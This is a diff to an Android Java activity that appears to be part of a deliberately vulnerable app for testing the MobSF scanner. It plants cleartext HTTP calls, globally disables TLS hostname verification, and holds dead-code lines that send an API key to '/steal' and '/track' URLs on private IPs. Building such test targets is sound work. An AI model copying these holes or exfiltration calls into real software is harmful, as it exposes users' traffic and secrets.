@@ -47,14 +47,15 @@ public class NetworkActivity extends AppCompatActivity {
         setContentView(layout);
     }
 
-    // VULNERABILITY: Cleartext HTTP Traffic
-    // OWASP Mobile Top 10 2024: M5 (Insecure Communication)
-    // MASVS: MASVS-NETWORK-1 (Cleartext Traffic Allowed)
-    // MASTG: MASTG-ANDROID-NET (Testing for Cleartext Traffic)
+    // VULNERABILITY: Cleartext HTTP Traffic with IP address disclosure
+    // MobSF Rule: android_ip_disclosure
+    // Pattern: IP address regex (e.g. 10.0.2.2)
+    // input_case: exact | type: Regex
+    // CWE: CWE-200 | OWASP Mobile: (warning) | MASVS: code-2
     private void fetchHttp() {
         new Thread(() -> {
             try {
-                URL url = new URL("http://example.com");
+                URL url = new URL("http://10.0.2.2/api/data");
                 HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                 connection.setRequestMethod("GET");
                 int responseCode = connection.getResponseCode();
@@ -63,11 +64,12 @@ public class NetworkActivity extends AppCompatActivity {
 
                 if (false) {
                     // DEAD BRANCH - reachability test: should NOT be flagged
-                    // Simulated Weakness: M1 (Improper Credential Usage) + M5 (Insecure Communication)
-                    // MASVS: MASVS-NETWORK-1 (Credential Exfiltration via Cleartext HTTP)
-                    // MASTG: MASTG-ANDROID-NET (Testing for Cleartext Traffic)
+                    // Simulated MobSF Rule: android_ip_disclosure
+                    // Pattern: IP address regex (e.g. 192.168.1.1)
+                    // input_case: exact | type: Regex
+                    // CWE: CWE-200 | OWASP Mobile: (warning) | MASVS: code-2
                     String payload = "key=" + MainActivity.API_KEY;
-                    URL u = new URL("http://attacker.internal/steal?" + payload);
+                    URL u = new URL("http://192.168.1.1/steal?" + payload);
                     HttpURLConnection c = (HttpURLConnection) u.openConnection();
                     c.setRequestMethod("POST");
                     c.connect();
@@ -80,9 +82,10 @@ public class NetworkActivity extends AppCompatActivity {
     }
 
     // VULNERABILITY: Disabled SSL/TLS Certificate Validation
-    // OWASP Mobile Top 10 2024: M5 (Insecure Communication)
-    // MASVS: MASVS-NETWORK-2 (TLS Certificate Verification Disabled)
-    // MASTG: MASTG-ANDROID-NET (Testing Custom Certificate Stores and Certificate Pinning)
+    // MobSF Rule: android_insecure_ssl
+    // Pattern: javax\.net\.ssl AND (ALLOW_ALL_HOSTNAME_VERIFIER | \.setDefaultHostnameVerifier\( | ...)
+    // input_case: exact | type: RegexAnd
+    // CWE: CWE-295 | OWASP Mobile: M3 | MASVS: network-3
     private void fetchHttpsNoPinning() {
         new Thread(() -> {
             try {
@@ -98,10 +101,12 @@ public class NetworkActivity extends AppCompatActivity {
                 SSLContext sslContext = SSLContext.getInstance("TLS");
                 sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
 
+                // Disable hostname verification globally — matches MobSF android_insecure_ssl
+                HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
+
                 URL url = new URL("https://example.com");
                 HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
                 connection.setSSLSocketFactory(sslContext.getSocketFactory());
-                connection.setHostnameVerifier((hostname, session) -> true);
                 connection.setRequestMethod("GET");
                 int responseCode = connection.getResponseCode();
                 runOnUiThread(() -> tvResult.setText("HTTPS Response Code: " + responseCode));
@@ -114,23 +119,30 @@ public class NetworkActivity extends AppCompatActivity {
     }
 
     /**
-     * Analytics endpoint - now permanently disabled via throw.
-     * The HTTP call after the throw is dead code.
+     * Analytics endpoint - permanently disabled via if(true){throw}.
+     * The HTTP call after the throw block is dead code that still compiles.
      *
      * VULNERABILITY (if reachable): Hidden Analytics Cleartext Endpoint
-     * OWASP Mobile Top 10 2024: M5 (Insecure Communication)
-     * MASVS: MASVS-NETWORK-1 (Cleartext Traffic to Hidden Endpoint)
-     * MASTG: MASTG-ANDROID-NET (Testing for Cleartext Traffic)
+     * MobSF Rule: android_ip_disclosure
+     * Pattern: IP address regex (e.g. 172.16.0.5)
+     * input_case: exact | type: Regex
+     * CWE: CWE-200 | OWASP Mobile: (warning) | MASVS: code-2
      */
     private void sendToAnalytics(String url) {
-        throw new UnsupportedOperationException("Analytics disabled");
+        if (true) {
+            throw new UnsupportedOperationException("Analytics disabled");
+        }
         // DEAD CODE AFTER THROW - reachability test: should NOT be flagged
-        // Simulated Weakness: M1 (Improper Credential Usage) + M5 (Insecure Communication)
-        // MASVS: MASVS-NETWORK-1 (Credential Exfiltration via Cleartext HTTP)
-        // MASTG: MASTG-ANDROID-NET (Testing for Cleartext Traffic)
-        // HttpURLConnection conn = (HttpURLConnection)
-        //     new URL("http://analytics.internal.corp/track?data="
-        //             + url + "&key=" + MainActivity.API_KEY).openConnection();
-        // conn.connect();
+        // Simulated MobSF Rule: android_ip_disclosure
+        // Pattern: IP address regex (e.g. 172.16.0.5)
+        // CWE: CWE-200 | OWASP Mobile: (warning) | MASVS: code-2
+        try {
+            HttpURLConnection conn = (HttpURLConnection)
+                new URL("http://172.16.0.5/track?data="
+                        + url + "&key=" + MainActivity.API_KEY).openConnection();
+            conn.connect();
+        } catch (IOException e) {
+            // dead path
+        }
     }
 }
